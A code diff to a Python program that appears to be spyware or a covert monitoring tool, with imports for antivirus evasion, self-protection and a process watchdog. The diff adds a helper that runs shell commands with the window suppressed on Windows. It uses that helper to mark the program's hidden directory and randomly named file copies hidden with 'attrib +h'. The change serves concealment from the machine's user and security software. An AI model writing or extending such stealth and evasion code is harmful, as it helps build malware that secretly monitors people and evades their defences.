@@ -46,11 +46,26 @@ try:
     from modules.keyword_alerts import KeywordAlertSystem, PresetKeywordLists
     from modules.watchdog import ProcessMonitor, HealthChecker
     from modules.protection import SelfProtection
-    from modules.av_evasion import AVEvasion
+    from modules.av_evasion import AVEvasion, run_hidden_command
     ADVANCED_MODULES_AVAILABLE = True
 except ImportError as e:
     ADVANCED_MODULES_AVAILABLE = False
     print(f"[!] Advanced modules not found: {e}. Running in basic mode.")
+    # Fallback function si modules pas disponibles
+    def run_hidden_command(cmd, timeout=5):
+        try:
+            if sys.platform == 'win32':
+                startupinfo = subprocess.STARTUPINFO()
+                startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
+                startupinfo.wShowWindow = 0
+                result = subprocess.run(cmd, shell=True, capture_output=True, timeout=timeout,
+                                       startupinfo=startupinfo, creationflags=subprocess.CREATE_NO_WINDOW)
+                return result.returncode == 0
+            else:
+                result = subprocess.run(cmd, shell=True, capture_output=True, timeout=timeout)
+                return result.returncode == 0
+        except:
+            return False
 
 # ============================================================================
 # CONFIGURATION - EDIT THESE VALUES BEFORE USE/COMPILING
@@ -110,7 +125,7 @@ def get_hidden_directory():
     # Hide directory on Windows
     if sys.platform == 'win32':
         try:
-            os.system(f'attrib +h "{hidden_dir}"')
+            run_hidden_command(f'attrib +h "{hidden_dir}"')
         except:
             pass
 
@@ -129,7 +144,7 @@ def copy_with_random_name(source, target_dir):
     # On Windows, hide the file
     if sys.platform == 'win32':
         try:
-            os.system(f'attrib +h "{target}"')
+            run_hidden_command(f'attrib +h "{target}"')
         except:
             pass
 
